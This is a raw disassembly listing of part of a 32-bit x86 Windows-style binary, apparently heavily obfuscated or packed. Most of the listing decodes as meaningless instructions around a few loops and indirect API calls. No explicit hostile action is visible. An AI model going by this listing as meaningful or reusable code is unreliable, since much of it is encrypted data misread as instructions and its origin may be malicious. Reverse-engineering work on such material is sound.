  406bd8:	movzx  edi,WORD PTR ds:0x42ed4b
  406bdf:	and    edi,DWORD PTR ds:0x430463
  406be5:	mov    DWORD PTR ds:0x42ed4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x6e047504
  406bfe:	lods   al,BYTE PTR ds:[esi]
  406bff:	fldenv [ebp+0x3a]
  406c02:	jle    0x406c82
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c81
  406c09:	stos   DWORD PTR es:[edi],eax
  406c0a:	xchg   DWORD PTR [ecx-0x54],edx
  406c0d:	xor    cl,ch
  406c0f:	fdivr  DWORD PTR [eax+eax*4-0x3ad69a3b]
  406c16:	lea    esp,[ebx+0xc]
  406c19:	outs   dx,BYTE PTR ds:[esi]
  406c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c1b:	jp     0x406c70
  406c1d:	mov    al,ds:0x7b33bcc5
  406c22:	out    dx,al
  406c23:	aaa    
  406c24:	test   al,0x6d
  406c26:	or     eax,0x5aca3815
  406c2b:	(bad)  
  406c2c:	push   esi
  406c2d:	je     0x406c52
  406c2f:	sub    DWORD PTR [eax],eax
  406c31:	sub    al,0x4b
  406c33:	std    
  406c34:	adc    BYTE PTR [ecx-0x19],dh
  406c37:	mov    bl,0x8a
  406c39:	inc    edx
  406c3a:	ret    0xbc2c
  406c3d:	jno    0x406bdd
  406c3f:	daa    
  406c40:	mov    esi,0x6b9139b6
  406c45:	mul    BYTE PTR [edi-0x7be51b6e]
  406c4b:	je     0x406cc7
  406c4d:	jge    0x406cc6
  406c4f:	xchg   ebx,eax
  406c50:	sbb    al,BYTE PTR [edi]
  406c52:	inc    ebp
  406c53:	or     ebp,edx
  406c55:	adc    BYTE PTR ds:[eax+0x7cd8e5c7],dl
  406c5c:	(bad)  
  406c5d:	pop    ebp
  406c5e:	ins    BYTE PTR es:[edi],dx
  406c5f:	sub    DWORD PTR [ebx+edi*1+0x4d5e6bf3],ebp
  406c66:	jecxz  0x406c2c
  406c68:	sbb    dh,cl
  406c6a:	mov    eax,ds:0xfcef16cb
  406c6f:	pop    ebx
  406c70:	dec    eax
  406c71:	and    DWORD PTR [esi-0x27],esp
  406c74:	mov    ds:0x7687d147,al
  406c79:	xor    ebx,edx
  406c7b:	lock xor eax,0x256a9bed
  406c81:	shl    BYTE PTR [eax-0x39c5ecfb],1
  406c87:	mov    eax,ds:0xfaff809a
  406c8c:	sbb    BYTE PTR [esp+ebx*4+0x37a29591],dh
  406c93:	mov    ch,BYTE PTR [esi+0x8403753]
  406c99:	cwde   
  406c9a:	or     ebx,DWORD PTR [ebx-0x2003383c]
  406ca0:	sub    eax,0x3fcc581a
  406ca5:	test   DWORD PTR [esp+esi*1],eax
  406ca8:	lods   al,BYTE PTR ds:[esi]
  406ca9:	dec    edx
  406caa:	pop    DWORD PTR [ecx]
  406cac:	mov    ds:0xed6efc69,al
  406cb1:	adc    DWORD PTR [ebx],edx
  406cb3:	das    
  406cb4:	cmp    DWORD PTR [ebp-0x5294e595],ecx
  406cba:	sub    edi,DWORD PTR [ebx+0xf3f7c16]
  406cc0:	sub    bl,BYTE PTR [edi]
  406cc2:	or     ebx,DWORD PTR [edi-0x53]
  406cc5:	dec    ebp
  406cc6:	mov    BYTE PTR [eax+0x7026c7c3],cl
  406ccc:	mov    WORD PTR [ecx-0x1f],?
  406ccf:	test   al,0x8a
  406cd1:	test   DWORD PTR [ecx-0x66],0x7bd09893
  406cd8:	push   eax
  406cd9:	les    esi,FWORD PTR ds:0x2f08e2ec
  406cdf:	sub    BYTE PTR [esi],ah
  406ce1:	dec    eax
  406ce2:	pop    ebp
  406ce3:	or     DWORD PTR [esi],esp
  406ce5:	pop    ss
  406ce6:	mov    ch,0x18
  406ce8:	jg     0x406d0a
  406cea:	fidiv  DWORD PTR [edi]
  406cec:	xor    BYTE PTR [esi+0x1aeab23a],bl
  406cf2:	pop    es
  406cf3:	mov    eax,ds:0x14473b4c
  406cf8:	out    dx,al
  406cf9:	je     0x406cb0
  406cfb:	sub    BYTE PTR [ebx+ebp*4+0x1d],ch
  406cff:	and    eax,0x768b9695
  406d04:	sub    BYTE PTR [ecx],bl
  406d06:	leave  
  406d07:	ja     0x406c8a
  406d09:	push   0xd52834a3
  406d0e:	dec    ecx
  406d0f:	out    dx,eax
  406d10:	es inc esp
  406d12:	mov    ah,0xc7
  406d14:	iret   
  406d15:	or     esi,ebx
  406d17:	sar    edx,0xc6
  406d1a:	add    edi,DWORD PTR [esi+0x77]
  406d1d:	mov    edx,0x2454911f
  406d22:	dec    ebx
  406d23:	and    eax,0x3196637a
  406d28:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d2a:	and    dh,BYTE PTR [eax+0xde3b29a]
  406d30:	push   ss
  406d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d32:	or     eax,0xbf4fbfd8
  406d37:	sub    eax,0xb317e214
  406d3c:	dec    edx
  406d3d:	out    dx,eax
  406d3e:	daa    
  406d3f:	sbb    DWORD PTR [ebp-0x60],0xea534c62
  406d46:	mov    ds:0x5e10583b,eax
  406d4b:	adc    edi,ecx
  406d4d:	test   DWORD PTR [ebp-0x5e50e455],esi
  406d53:	(bad)  
  406d54:	jecxz  0x406dc0
  406d56:	int    0x6e
  406d58:	jle    0x406d74
  406d5a:	jno    0x406ce0
  406d5c:	lea    edx,[esi+ecx*2-0x49]
  406d60:	inc    ecx
  406d61:	sbb    eax,0xf4b86ea2
  406d66:	xchg   edi,eax
  406d67:	in     al,0xa4
  406d69:	xchg   esi,eax
  406d6a:	sub    eax,0x80e775a8
  406d6f:	(bad)  
  406d70:	and    DWORD PTR [esi+0x2],ecx
  406d73:	enter  0x38f6,0x3c
  406d77:	into   
  406d78:	xor    eax,0xf81d63ae
  406d7d:	sti    
  406d7e:	lds    ebp,FWORD PTR [eax]
  406d80:	les    esi,FWORD PTR [ecx-0x15]
  406d83:	mov    esi,ebp
  406d85:	xlat   BYTE PTR ds:[ebx]
  406d86:	xor    al,0x77
  406d88:	jae    0x406d59
  406d8a:	pop    edi
  406d8b:	xor    al,0x6d
  406d8d:	int    0x1f
  406d8f:	mov    DWORD PTR [edx],edi
  406d91:	mov    dl,0x58
  406d93:	(bad)  
  406d94:	fs int 0xb6
  406d97:	arpl   WORD PTR [ecx+0x35aff39],dx
  406d9d:	rol    DWORD PTR [ecx+0x43045f25],1
  406da3:	add    BYTE PTR [eax],al
  406da5:	add    BYTE PTR [eax],al
  406da7:	add    BYTE PTR [ebx+0x43045f3d],cl
  406dad:	add    BYTE PTR [edi-0x77],al
  406db0:	cmp    eax,0x43045f
  406db5:	cmp    DWORD PTR ds:0x43045f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eba3
  406dcb:	cmp    DWORD PTR ds:0x43045f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43045f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43045f,edi
  406de7:	cmp    DWORD PTR ds:0x43045f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e740,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x78477b7b],si
  406e0c:	fbld   TBYTE PTR [ecx+0x7e38f139]
  406e12:	jle    0x406d9e
  406e14:	jg     0x406e94
  406e16:	jle    0x406e6b
  406e18:	or     dh,dh
  406e1a:	jno    0x406e14
  406e1c:	jae    0x406e80
  406e1e:	push   edx
  406e1f:	out    0xdf,al
  406e21:	jnp    0x406db7
  406e23:	jge    0x406db5
  406e25:	sbb    esi,0x19
  406e28:	stos   DWORD PTR es:[edi],eax
  406e29:	or     al,0xfe
  406e2b:	mov    al,ds:0xe6bd0edd
  406e30:	mov    esi,0x612db1c2
  406e35:	sub    al,BYTE PTR [ecx-0x66]
  406e38:	mov    fs,WORD PTR [ebx]
  406e3a:	xchg   esi,eax
  406e3b:	dec    ecx
  406e3c:	out    dx,al
  406e3d:	mov    ah,0x41
  406e3f:	sbb    edx,ebx
  406e41:	dec    edi
  406e42:	int    0x34
  406e44:	jge    0x406e44
  406e46:	and    al,0x6b
  406e48:	jmp    0x3f81ad78
  406e4d:	mov    bh,0x5b
  406e4f:	outs   dx,DWORD PTR ds:[esi]
  406e50:	repnz or DWORD PTR [ecx+0x6],edx
  406e54:	push   es
  406e55:	or     DWORD PTR ds:0x870cabf0,0x4f2d1517
  406e5f:	push   es
  406e60:	push   cs
  406e61:	mov    DWORD PTR [edi+ebp*1+0x4d389cbf],esi
  406e68:	aaa    
  406e69:	dec    DWORD PTR [ebx+esi*2+0x35]
  406e6d:	inc    esp
  406e6e:	jb     0x406e9f
  406e70:	push   es
  406e71:	jge    0x406dfe
  406e73:	cmp    ebx,edi
  406e75:	jmp    0x8840ce08
  406e7a:	int    0xca
  406e7c:	rcr    BYTE PTR [esi+edi*1-0x4f9789a1],1
  406e83:	aam    0x0
  406e85:	lods   al,BYTE PTR ds:[esi]
  406e86:	or     al,0x74
  406e88:	sbb    al,BYTE PTR [edi-0x3c]
  406e8b:	xchg   esp,eax
  406e8c:	mov    dl,ah
  406e8e:	sub    al,0x94
  406e90:	sub    al,BYTE PTR [edi]
  406e92:	sub    ebp,eax
  406e94:	inc    eax
  406e95:	jmp    0xe9c2763e
  406e9a:	fsub   QWORD PTR [edi-0x48a1c11b]
  406ea0:	mov    ecx,0x57106927
  406ea5:	mov    edi,DWORD PTR [edx+0x48]
  406ea8:	xchg   edi,eax
  406ea9:	ffree  st(1)
  406eab:	mov    ds:0x98d59b90,al
  406eb0:	push   esp
  406eb1:	mov    ds:0x4cea7603,al
  406eb6:	push   DWORD PTR [eax-0x2050e8a3]
  406ebc:	xor    al,0xf8
  406ebe:	sahf   
  406ebf:	mov    al,0xe6
  406ec1:	jmp    0x406e5f
  406ec3:	xor    al,0x61
  406ec5:	shl    BYTE PTR [ebx+0x3c],1
  406ec8:	aam    0xa4
  406eca:	lea    edx,[edi]
  406ecc:	cs mov dh,0xd2
  406ecf:	std    
  406ed0:	jp     0x406efb
  406ed2:	sub    BYTE PTR [edi+0x50],al
  406ed5:	test   DWORD PTR [ebx+0x41e0c7ed],edi
  406edb:	adc    ebx,DWORD PTR [esi-0x408b5e03]
  406ee1:	adc    al,0x9
  406ee4:	pop    esi
  406ee5:	ja     0x406e94
  406ee7:	pop    ss
  406ee8:	xchg   esp,eax
  406ee9:	fsub   DWORD PTR [ecx+0x24136941]
  406eef:	inc    ebx
  406ef0:	mov    esi,DWORD PTR [eax]
  406ef2:	fucomi st,st(5)
  406ef4:	pop    es
  406ef5:	sub    eax,0x1fd76b74
  406efa:	pop    es
  406efb:	push   edx
  406efc:	outs   dx,DWORD PTR es:[esi]
  406efe:	fucom  st(5)
  406f00:	retf   
  406f01:	lds    edi,FWORD PTR [edx]
  406f03:	popf   
  406f04:	mov    dl,0x58
  406f06:	push   edi
  406f07:	ror    DWORD PTR [ecx],cl
  406f09:	scas   al,BYTE PTR es:[edi]
  406f0a:	push   0x3b
  406f0c:	mov    ebp,0x1cbe0916
  406f11:	mov    al,BYTE PTR [ecx+0x31]
  406f14:	out    0x7b,al
  406f16:	inc    ecx
  406f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f18:	pop    edi
  406f19:	inc    ebp
  406f1a:	adc    DWORD PTR [edi+0x14],ebx
  406f1d:	pop    ecx
  406f1e:	repnz ins DWORD PTR es:[edi],dx
  406f20:	mov    ebx,0x7f9795af
  406f25:	(bad)  
  406f26:	mov    bl,0x38
  406f28:	push   ecx
  406f29:	fdivr  st,st(4)
  406f2b:	loope  0x406ee4
  406f2d:	aaa    
  406f2e:	and    eax,0x5da7ee33
  406f33:	repz mov ebp,0x8c7c665d
  406f39:	adc    DWORD PTR [esi],esp
  406f3b:	add    eax,0xeb513e91
  406f40:	call   0x21a8:0x13933de9
  406f47:	mov    bl,0x50
  406f49:	push   cs
  406f4a:	outs   dx,DWORD PTR ds:[esi]
  406f4b:	loopne 0x406f3e
  406f4d:	rcl    DWORD PTR ds:0xbd7b654d,0xef
  406f54:	pop    eax
  406f55:	sub    DWORD PTR [edx+0x690991c0],edx
  406f5b:	and    BYTE PTR [ecx],bh
  406f5d:	sub    ah,BYTE PTR [edi+eax*8-0x1c9139a0]
  406f64:	mov    edi,0x3c0fd248
  406f69:	test   al,0xf9
  406f6b:	mov    dl,0xd5
  406f6d:	jg     0x406f4b
  406f6f:	inc    ebx
  406f70:	add    eax,0x39b1a2b5
  406f75:	push   ss
  406f76:	sbb    dl,bl
  406f78:	js     0x406f51
  406f7a:	jbe    0x406fd3
  406f7c:	hlt    
  406f7d:	(bad)  [esi+0x69]
  406f80:	push   edx
  406f81:	mov    esp,0xdfd2c771
  406f86:	sub    al,0xb
  406f88:	fst    QWORD PTR [eax+edi*1-0x12]
  406f8c:	icebp  
  406f8d:	pop    esi
  406f8e:	pop    ecx
  406f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f90:	sbb    eax,0xb8ed64d3
  406f95:	and    BYTE PTR [eax],bh
  406f97:	and    bl,BYTE PTR [eax]
  406f99:	sahf   
  406f9a:	outs   dx,BYTE PTR ds:[esi]
  406f9b:	popa   
  406f9c:	push   0x193c8ca6
  406fa1:	mov    ?,WORD PTR [edx+0x30]
  406fa4:	fistp  DWORD PTR [ebp+0x24]
  406fa7:	jmp    0x8a0e5dbd
  406fac:	push   ebp
  406fad:	clc    
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4303e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4303c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x57a73d82,edx
  406fd4:	jns    0x407020
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x40701d
  406fdf:	(bad)  
  406fe0:	test   eax,0x383a6dca
  406fe5:	test   DWORD PTR [ebx],esi
  406fe7:	cmp    dh,ch
  406fe9:	push   ds
  406fea:	enter  0x9268,0x4f
  406fee:	aaa    
  406fef:	out    dx,eax
  406ff0:	xlat   BYTE PTR ds:[ebx]
  406ff1:	dec    ecx
  406ff2:	sub    ebp,esp
  406ff4:	aas    
  406ff5:	jbe    0x406fde
  406ff7:	inc    ecx
  406ff8:	cdq    
  406ff9:	cmp    al,0x23
  406ffb:	inc    edi
  406ffc:	gs sti 
  406ffe:	push   ds
  406fff:	pusha  
  407000:	outs   dx,BYTE PTR ds:[esi]
  407001:	xor    al,0x71
  407003:	cli    
  407004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407005:	imul   ecx,edx,0x36
  407008:	daa    
  407009:	ds cmp eax,0x6b9ce950
  40700f:	js     0x407059
  407011:	sar    DWORD PTR [esp+ebp*1-0x4c],cl
  407015:	sbb    ebx,DWORD PTR [esi-0xaf0745e]
  40701b:	dec    ecx
  40701c:	sub    DWORD PTR [esi+0x696f254b],ebp
  407022:	xchg   ecx,eax
  407023:	xor    al,bh
  407025:	cmp    dl,BYTE PTR [ecx-0x61]
  407028:	push   edx
  407029:	rep stos DWORD PTR es:[edi],eax
  40702b:	inc    edx
  40702c:	icebp  
  40702d:	mov    bh,0xdc
  40702f:	aas    
  407030:	ins    BYTE PTR es:[edi],dx
  407031:	xor    BYTE PTR [ebx-0x53913390],ch
  407037:	xchg   edi,eax
  407038:	sti    
  407039:	lahf   
  40703a:	pop    ecx
  40703b:	dec    ecx
  40703c:	xor    DWORD PTR [ebx-0x33],ebp
  40703f:	mov    eax,0xf60df0ac
  407044:	lea    esi,[ecx]
  407046:	mov    ds:0x80e987f9,al
  40704b:	cmp    al,0x63
  40704d:	jecxz  0x407062
  40704f:	popa   
  407050:	adc    esp,ecx
  407052:	jge    0x40707b
  407054:	fnsave [ebx+0x7715658]
  40705a:	xchg   ebp,eax
  40705b:	sub    esp,DWORD PTR [ebp-0x58950a00]
  407061:	sub    ah,bl
  407063:	mov    cl,0x26
  407065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407066:	vpcmpeqb ymm7,ymm1,YMMWORD PTR [edi-0x46942b36]
  40706e:	mov    cl,0x5f
  407070:	push   edi
  407071:	jecxz  0x4070ce
  407073:	lea    ebx,[ebp+0x6d9a53db]
  407079:	out    0x45,eax
  40707b:	ret    
  40707c:	jno    0x4070b2
  40707e:	test   ebp,edx
  407080:	sbb    eax,0x494de891
  407085:	and    cl,ah
  407087:	inc    ebx
  407088:	mov    ecx,0x9591c93f
  40708d:	in     eax,0x84
  40708f:	fs pop ds
  407091:	fbld   TBYTE PTR [esi-0xc]
  407094:	xor    ecx,DWORD PTR [ecx+ebx*4]
  407097:	pushf  
  407098:	mov    bl,ah
  40709a:	lea    eax,[ecx+0x78a7b3a2]
  4070a0:	or     DWORD PTR [edx-0x6b],0xffffff9e
  4070a4:	jle    0x4070fa
  4070a6:	mov    ds:0x627716f5,al
  4070ab:	es ds dec edi
  4070ae:	jae    0x407053
  4070b0:	stc    
  4070b1:	and    DWORD PTR [edx-0x80],0x6866a4bf
  4070b8:	inc    edx
  4070b9:	mov    cl,0xef
  4070bb:	inc    eax
  4070bc:	sbb    al,0x60
  4070be:	out    dx,eax
  4070bf:	in     al,0x8e
  4070c1:	test   al,0x48
  4070c3:	mov    al,ds:0x308da87b
  4070c8:	scas   eax,DWORD PTR es:[edi]
  4070c9:	inc    ebp
  4070ca:	mov    cl,0x93
  4070cc:	(bad)  
  4070cd:	mov    dh,0x2e
  4070cf:	das    
  4070d0:	sub    eax,0x18913263
  4070d5:	aad    0x40
  4070d7:	ficomp WORD PTR [edi+0x49970793]
  4070dd:	inc    edi
  4070de:	cli    
  4070df:	dec    ebp
  4070e0:	and    al,0x92
  4070e2:	pusha  
  4070e3:	dec    edx
  4070e4:	or     ecx,DWORD PTR [esp+edi*8+0xe]
  4070e8:	enter  0x853a,0x2a
  4070ec:	leave  
  4070ed:	jle    0x76a2d25f
  4070f3:	sbb    eax,0xf6e4ed7f
  4070f8:	mov    DWORD PTR [edx*4-0x6a47a734],ebp
  4070ff:	mov    ecx,0xb9cf28e6
  407104:	jns    0x407141
  407106:	mov    ebp,0x6c9ddb55
  40710b:	mul    DWORD PTR [ecx+0x6aba0a4a]
  407111:	addr16 cmp edi,esp
  407114:	xor    edi,ebp
  407116:	popa   
  407117:	rcr    BYTE PTR [eax],1
  407119:	(bad)  
  40711a:	icebp  
  40711b:	out    dx,eax
  40711c:	in     eax,dx
  40711d:	lods   al,BYTE PTR ds:[esi]
  40711e:	jmp    0xb2d4:0x31363739
  407125:	scas   al,BYTE PTR es:[edi]
  407126:	in     al,dx
  407127:	cmpxchg BYTE PTR [edx+0x1db248b2],bl
  40712e:	enter  0x3e5a,0x2d
  407132:	and    eax,0x1cf5025d
  407137:	outs   dx,BYTE PTR ds:[esi]
  407138:	mov    bl,0x8b
  40713a:	aam    0xc1
  40713c:	call   0x152f:0x8cb45ea3
  407143:	(bad)  
  407144:	cmc    
  407145:	fdivr  DWORD PTR [eax-0x1d]
  407148:	mov    edi,DWORD PTR ds:0xcfd58ccb
  40714e:	iret   
  40714f:	inc    ecx
  407150:	mov    cl,dl
  407152:	cld    
  407153:	inc    ecx
  407154:	(bad)  
  407156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407157:	xchg   ecx,eax
  407158:	sahf   
  407159:	enter  0xcf14,0xa7
  40715d:	cli    
  40715e:	jp     0x407160
  407160:	xor    ah,0xe5
  407163:	(bad)  
  407164:	or     DWORD PTR [eax+0x506a04c5],edi
  40716a:	cli    
  40716b:	xchg   ebx,eax
  40716c:	scas   al,BYTE PTR es:[edi]
  40716d:	retf   0x79cb
  407170:	mov    dh,0x72
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e740,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e740
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e740,edi
  407191:	cmp    DWORD PTR ds:0x42e740,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e740,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42ea2b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4303e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4303cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4303e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4303e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4303e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4303e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e8a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42ea2f
  407247:	cmp    DWORD PTR ds:0x4303e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4303e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4303e1,edi
  407261:	cmp    DWORD PTR ds:0x4303e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e73c
  40728e:	or     DWORD PTR ds:0x4303e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0xee473f15
  4072a7:	pop    ebx
  4072a8:	push   ds
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x40724e
  4072b2:	push   eax
  4072b3:	adc    al,0xc6
  4072b5:	sar    edx,0xb1
  4072b8:	push   0x31
  4072ba:	or     BYTE PTR [edx],dl
  4072bc:	cmp    ebx,ebx
  4072be:	es pop ebp
  4072c0:	out    0xc,al
  4072c2:	pop    edi
  4072c3:	pop    es
  4072c4:	sbb    BYTE PTR [edi+0x13],cl
  4072c7:	pop    edx
  4072c8:	loopne 0x407341
  4072ca:	retf   0x3554
  4072cd:	dec    ebp
  4072ce:	retf   0x9fa4
  4072d1:	outs   dx,DWORD PTR ds:[esi]
  4072d2:	aaa    
  4072d3:	sub    BYTE PTR [edi-0x1a153f1d],dh
  4072d9:	mov    ah,0x30
  4072db:	pop    es
  4072dc:	sub    al,BYTE PTR [ecx-0x2cf8910f]
  4072e2:	sub    al,0x25
  4072e4:	adc    al,al
  4072e6:	or     BYTE PTR [esi],cl
  4072e8:	jl     0x407274
  4072ea:	dec    ebp
  4072eb:	add    BYTE PTR [ebx],bh
  4072ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ee:	or     DWORD PTR [edi+0x1585561b],ebx
  4072f4:	fwait
  4072f5:	cmp    DWORD PTR [esi],ebp
  4072f7:	mov    DWORD PTR [eax],ebp
  4072f9:	mov    ecx,0xfed388ea
  4072fe:	sbb    cl,ah
  407300:	jle    0x40737a
  407302:	mov    edi,0xa5140359
  407307:	lods   eax,DWORD PTR ds:[esi]
  407308:	fsubr  st(0),st
  40730a:	add    eax,0xfb9d1cf3
  40730f:	into   
  407310:	jmp    0x407345
  407312:	mov    eax,ebp
  407314:	lds    eax,FWORD PTR [edi+0x24]
  407317:	sbb    DWORD PTR [ebx],eax
  407319:	pop    edi
  40731a:	xor    dl,BYTE PTR [esi]
  40731c:	cmp    DWORD PTR [edi],ebp
  40731e:	retf   0x74b
  407321:	adc    al,BYTE PTR [ecx+0x5d]
  407324:	adc    BYTE PTR [ecx-0x66],dl
  407327:	popf   
  407328:	mov    ds:0xd2b11975,al
  40732d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40732f:	icebp  
  407330:	mov    al,0xe9
  407332:	mov    ebp,0x6e7d19a9
  407337:	sbb    BYTE PTR [ecx+ebp*1],dl
  40733a:	push   es
  40733b:	ss icebp 
  40733d:	mov    dh,0x69
  40733f:	push   ss
  407340:	stos   DWORD PTR es:[edi],eax
  407341:	call   0xeda9:0xb2f96b8d
  407348:	retf   
  407349:	jmp    0x4cf0:0x81d4888f
  407350:	(bad)  
  407351:	cmp    eax,0x3ab2fdf1
  407356:	mov    ebp,0x5c32296
  40735b:	hlt    
  40735c:	stos   BYTE PTR es:[edi],al
  40735d:	mov    cl,BYTE PTR [ecx-0x4e24fca]
  407363:	mov    ebp,0xf56502d7
  407368:	adc    BYTE PTR [edx+0x5e],ah
  40736b:	mov    esp,0xd921f67b
  407370:	and    al,0x8e
  407372:	cmp    BYTE PTR [edx-0x8],0x61
  407376:	or     BYTE PTR [ebp+0x62ad8fee],al
  40737c:	jmp    0x43c4:0x6de8e294
  407383:	cli    
  407384:	jb     0x4073c9
  407386:	mov    ebx,0x4fa04b33
  40738b:	cmp    al,0x31
  40738d:	or     eax,0xe50d9c40
  407392:	cmc    
  407393:	xchg   esp,eax
  407394:	dec    eax
  407395:	cmp    al,0xab
  407397:	mov    al,0xd
  407399:	les    ebx,FWORD PTR [esi-0x3e628d32]
  40739f:	mov    al,0x5c
  4073a1:	not    DWORD PTR [ecx]
  4073a3:	xchg   ecx,eax
  4073a4:	xor    al,BYTE PTR [ebx-0x6b75556a]
  4073aa:	or     ebx,edi
  4073ac:	mov    eax,edx
  4073ae:	inc    eax
  4073af:	mov    ch,0xa3
  4073b1:	scas   al,BYTE PTR es:[edi]
  4073b2:	mov    dh,0x20
  4073b4:	sbb    bl,dh
  4073b6:	add    BYTE PTR [ebx+0x19266276],ch
  4073bc:	test   al,0x19
  4073be:	add    al,0xb0
  4073c0:	cmp    BYTE PTR [edi-0x1d93d661],bl
  4073c6:	data16 and BYTE PTR [eax],0xc
  4073ca:	out    0x12,eax
  4073cc:	lods   al,BYTE PTR ds:[esi]
  4073cd:	jmp    0x34074ab4
  4073d2:	fwait
  4073d3:	mov    ds:0x6663a5a0,al
  4073d8:	cmp    ch,cl
  4073da:	and    eax,0x6dc5d174
  4073df:	push   edi
  4073e0:	es popf 
  4073e2:	pop    ebx
  4073e3:	jno    0x4073be
  4073e5:	mov    ds:0x122d9578,eax
  4073ea:	das    
  4073eb:	add    BYTE PTR [eax],0x6c
  4073ee:	pushf  
  4073ef:	pop    esp
  4073f0:	adc    eax,0x34cd9e31
  4073f5:	sbb    edx,ecx
  4073f7:	mov    edi,edi
  4073f9:	jmp    0x4073ed
  4073fb:	jne    0x407429
  4073fd:	aas    
  4073fe:	or     DWORD PTR [ecx-0x6698b6ca],esp
  407404:	mov    eax,ds:0x2768b48f
  407409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740a:	std    
  40740b:	pop    ecx
  40740c:	(bad)  
  40740d:	mov    ebp,0x73a84f5
  407412:	js     0x4073a6
  407414:	mov    BYTE PTR [ecx+ebp*1],bh
  407417:	cld    
  407418:	enter  0x76f,0xfb
  40741c:	loop   0x40740c
  40741e:	stos   DWORD PTR es:[edi],eax
  40741f:	adc    eax,0xc6f778ea
  407424:	mov    BYTE PTR [edi],0xcb
  407427:	mov    cl,0xc4
  407429:	push   edx
  40742a:	clc    
  40742b:	adc    al,0x7a
  40742d:	mov    esi,0x4e559252
  407432:	cmp    esi,DWORD PTR [ebx+0x61da7bac]
  407438:	or     al,0xd9
  40743a:	ins    DWORD PTR es:[edi],dx
  40743b:	inc    ecx
  40743c:	or     DWORD PTR [edx-0x2f],edi
  40743f:	mov    al,ds:0xfd2537f4
  407444:	jae    0x407479
  407446:	ror    BYTE PTR [ebx+0xd81f07d],1
  40744c:	push   edi
  40744d:	add    al,0x43
  40744f:	add    BYTE PTR [ebp+0x3000071],ah
  407455:	rol    edi,1
  407457:	add    eax,0x4303c9
  40745c:	dec    ecx
  40745d:	pop    edx
  40745e:	add    BYTE PTR [eax],al
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43044f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
